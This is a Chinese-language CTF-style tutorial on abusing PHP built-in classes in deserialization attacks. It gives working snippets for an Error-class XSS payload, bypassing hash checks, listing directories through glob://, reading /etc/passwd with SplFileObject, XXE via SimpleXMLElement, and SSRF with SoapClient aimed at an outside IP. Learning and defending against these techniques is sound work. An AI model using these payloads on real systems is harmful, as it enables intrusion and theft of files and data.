[TOC]



## php内置类小结



### Error、Exception进行xss、绕过hash比较



#### Error类

**Error(PHP 7, PHP 8)**  是所有PHP内部错误类的基类。

- 使用与php7以后的版本
- 需要有报错的情况

Error类是php的一个内置类，通常用于自定义一个Error，在php7版本后适用，可能存在xss漏洞，因为内置了一个 `__toString()` 方法。常用于php反序列化中，如果有个pop链走不通了，可能需要使用这个类做一个xss，当php对象被当作一个字符串输出或使用的时候（如：`echo` ）会触发 `__toString()` 方法




下面我们来测试一下如何使用Error类构造xss

测试代码：

```php
<?php
    $a = unserialize($_GET['whoami']);
    echo $a;
?>
```

poc

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>

//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

测试一下：

![image-20230530181322872](https://s2.loli.net/2023/05/30/9MbqdKyjVUJfaiI.png)



成功触发xss漏洞



#### Exception类

- php5、7版本以后
- 开启报错

触发xss和上面一样，此处不再赘述





#### 使用Error、Exception内置类绕过md5、sha1等哈希比较

我们详细介绍一下Error、Exception类

##### Error类详解

```php
class Error implements Throwable {
    /* 属性 */
    protected string $message = "";
    private string $string = "";
    protected int $code;
    protected string $file = "";
    protected int $line;
    private array $trace = [];
    private ?Throwable $previous = null;
    /* 方法 */
    public __construct(string $message = "", int $code = 0, ?Throwable $previous = null)
    final public getMessage(): string
    final public getPrevious(): ?Throwable
    final public getCode(): int
    final public getFile(): string
    final public getLine(): int
    final public getTrace(): array
    final public getTraceAsString(): string
    public __toString(): string
    private __clone(): void
}
```

**类属性：**

- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数

**类方法：**

- [`Error::__construct`](https://www.php.net/manual/zh/error.construct.php) — 初始化 error 对象
- [`Error::getMessage`](https://www.php.net/manual/zh/error.getmessage.php) — 获取错误信息
- [`Error::getPrevious`](https://www.php.net/manual/zh/error.getprevious.php) — 返回先前的 Throwable
- [`Error::getCode`](https://www.php.net/manual/zh/error.getcode.php) — 获取错误代码
- [`Error::getFile`](https://www.php.net/manual/zh/error.getfile.php) — 获取错误发生时的文件
- [`Error::getLine`](https://www.php.net/manual/zh/error.getline.php) — 获取错误发生时的行号
- [`Error::getTrace`](https://www.php.net/manual/zh/error.gettrace.php) — 获取调用栈（stack trace）
- [`Error::getTraceAsString`](https://www.php.net/manual/zh/error.gettraceasstring.php) — 获取字符串形式的调用栈（stack trace）
- [`Error::__toString`](https://www.php.net/manual/zh/error.tostring.php) — error 的字符串表达
- [`Error::__clone`](https://www.php.net/manual/zh/error.clone.php) — 克隆 error



##### Exception类详解

```php
class Exception {
    /* 属性 */
    protected string $message ;
    protected int $code ;
    protected string $file ;
    protected int $line ;
    /* 方法 */
    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )
    final public getMessage ( ) : string
    final public getPrevious ( ) : Throwable
    final public getCode ( ) : mixed
    final public getFile ( ) : string
    final public getLine ( ) : int
    final public getTrace ( ) : array
    final public getTraceAsString ( ) : string
    public __toString ( ) : string
    final private __clone ( ) : void
}
```

**类属性：**

- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号

**类方法：**

- [`Exception::__construct`](https://www.php.net/manual/zh/exception.construct.php) — 异常构造函数
- [`Exception::getMessage`](https://www.php.net/manual/zh/exception.getmessage.php) — 获取异常消息内容
- [`Exception::getPrevious`](https://www.php.net/manual/zh/exception.getprevious.php) — 返回异常链中的前一个异常
- [`Exception::getCode`](https://www.php.net/manual/zh/exception.getcode.php) — 获取异常代码
- [`Exception::getFile`](https://www.php.net/manual/zh/exception.getfile.php) — 创建异常时的程序文件名称
- [`Exception::getLine`](https://www.php.net/manual/zh/exception.getline.php) — 获取创建的异常所在文件中的行号
- [`Exception::getTrace`](https://www.php.net/manual/zh/exception.gettrace.php) — 获取异常追踪信息
- [`Exception::getTraceAsString`](https://www.php.net/manual/zh/exception.gettraceasstring.php) — 获取字符串类型的异常追踪信息
- [`Exception::__toString`](https://www.php.net/manual/zh/exception.tostring.php) — 将异常对象转换为字符串
- [`Exception::__clone`](https://www.php.net/manual/zh/exception.clone.php) — 异常克隆



我们可以清楚的看到，两个类都带有 `__toString()` 方法，将异常对象转化为字符串

我们以`Exception`为例，查看一下异常对象的字符串：

```php
<?php

$e = new Exception("payload",2);
echo $e;
```

![image-20230530182217064](https://s2.loli.net/2023/05/30/beRrBcxV2LhuAZq.png)

发现这会以字符串的方式输出报错，并且包含当前的错误信息：`payload` 和 当前报错的行号 `3` ，但是传入的错误代码`2` 没有显示出来

我们看一下另一个例子：

```php
<?php
$a = new Exception("payload",1);$b = new Exception("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;
```

输出结果：

```php
Exception: payload in D:\Applications\CTF\phpstudy_pro\WWW\demo.php:2
Stack trace:
#0 {main}

Exception: payload in D:\Applications\CTF\phpstudy_pro\WWW\demo.php:2
Stack trace:
#0 {main}
```

我们发现：这两个异常对象是不同的（异常代码不同）但`__toString()`方法的输出的结果一模一样，

因为此时我们控制了 `payload` 和 行号`2`一致（这里写在一行就是为了保证行号一致）

我们可以利用这个特性去绕过**md5()**、**sha1()**等哈希比较  。 Error用法一致（注意php版本）





##### 例题：[2020 极客大挑战]Greatphp

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

这一题就可以使用这个特性去绕过哈希比较，我在另一篇文章写了，此处不再重复

```php
if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )
```





### 使用DirectaryIterator、Filesystemlterator、Globlterator内置类读目录



#### Directorylterator

- (PHP 5, PHP 7, PHP 8)

`DirectoryIterator`与`glob://协议`结合可以进行目录读取

```php
<?php
highlight_file(__FILE__);
$leekos = $_GET['leekos'];
$obj = new DirectoryIterator($leekos);
foreach($obj as $o) {
	echo $o->__toString()."<br/>";
}
```

![image-20230530185328183](https://s2.loli.net/2023/05/30/98ehFsSuLtb3dKQ.png)



成功读取到根目录的文件



#### FilesystemIterator 

- (PHP 5 >= 5.3.0, PHP 7, PHP 8)

```php
class FilesystemIterator extends DirectoryIterator
```

从官方文档看出这两个类是继承关系，`FilesystemIterator`内置类也有一个 `__toString()` 方法

我们同样可以使用`glob伪协议`读取目录：

```php
<?php
highlight_file(__FILE__);
$leekos = $_GET['leekos'];
$obj = new FilesystemIterator($leekos);
foreach($obj as $o) {
    echo $o->__toString()."<br/>";
}
```

![image-20230530185704719](https://s2.loli.net/2023/05/30/TM9FtNOAUKVPirR.png)

并且从图中就可以看出这两个原生类的些许区别了，`Filesystemlterator`会以绝对路径的形式展现，而`DirectoryIterator`仅显示出当前目录下的文件信息



#### 一句话DirectoryIterator、Filesystemlterator



**DirectoryIterator**

```php
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

**FilesystemIterator**

```php
$a = new FilesystemIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```





#### Globlterator

- (PHP 5 >= 5.3.0, PHP 7, PHP 8)

与前两个类的作用相似，`GlobIterator` 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于使用 `glob()` 函数，可以通过模式匹配来寻找文件路径。

```php
<?php
highlight_file(__FILE__);
$leekos = $_GET['leekos'];
$obj = new GlobIterator($leekos);
foreach($obj as $o) {
    echo $o->__toString()."<br/>";
}
```

<img src="https://s2.loli.net/2023/05/30/pdQVroSUlCnDq85.png" alt="image-20230530190416823" style="zoom:50%;" />

看了一下文档发现该原生类是继承FilesystemIterator的，所以也是以绝对路径显示的

（需要注意的是，我们使用GlobIterator只需要输入路径即可，不需要添加glob://）





#### SplFileObject 读取文件内容

- (PHP 5 >= 5.1.0, PHP 7, PHP 8)



SplFileObject内置类存在 `__toString()`方法

使用`SplFileObject`类读取 `/etc/passwd`文件内容

```php
<?php
highlight_file(__file__);
$leekos = $_GET['leekos'];
$context = new SplFileObject($leekos);
foreach($context as $f){
    echo $f;
}
```

<img src="https://s2.loli.net/2023/05/30/wDvIQibhsj5WHnS.png" alt="image-20230530200204445" style="zoom:50%;" />





### 使用SimpleXMLElement类进行XXE

SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。

![image-20230530201752914](https://s2.loli.net/2023/05/30/2niyHx1mhNKMaDe.png)

![image-20230530201800846](https://s2.loli.net/2023/05/30/P5smgX4ASREOHwc.png)

可以看到当我们设置SimpleXMLElement类构造方法的 `data_is_url`参数为：`true` 时，我们可以实现远程包含xml文件，然后`data`参数就设置为xml的远程地址即可，第2个参数我们设置为2即可

然后我们xml文件外带数据进行xxe即可



### 使用SoapClient类进行SSRF

- （PHP 5、PHP 7、PHP 8）

> SoapClient 类为[» SOAP 1.1](http://www.w3.org/TR/soap11/)、 [» SOAP 1.2](http://www.w3.org/TR/soap12/)服务器提供客户端。它可以在 WSDL 或非 WSDL 模式下使用。

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端

`SoapClient`类的构造函数如下：

```php
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

- 第一个参数是用来指明是否是wsdl模式，将该值设为**null**则表示非wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则**必须设置location和uri选项**，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

SoapClient类还有一个 `__call()`方法，当我们调用对象中不存在的方法时会触发 `__call()`方法

当 `__call()` 方法被触发后，可以发送http、https请求。正是由于这个方法，可以导致SSRF漏洞



我们测试一下：

```php
<?php
highlight_file(__FILE__);
$s = new  SoapClient(null,array('location'=>'http://49.235.108.15:9996/aaa','uri'=>'http://49.235.108.15:9996'));
$b =  serialize($s);

echo $b;
$c = unserialize($b);

$c->a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
```

首先在服务器监听9996端口，运行代码：

![image-20230530205423625](https://s2.loli.net/2023/05/30/cfgYlXbJZsOLi8v.png)

服务器成功收到请求

但是它只局限于http、https协议，没什么用。

如果存在**CRLF漏洞**(\r\n)，我们可以通过 SSRF+CRLF组合拳插入任意的HTTP头







### ReflectionMethod内置类获取注释内容

- (PHP 5 >= 5.1.0, PHP 7, PHP 8)

`ReflectionFunction`类的`getDocComment()`方法可以获取注释内容

```php
public ReflectionFunctionAbstract::getDocComment(): string|false
    //从函数中获取文档注释
```



















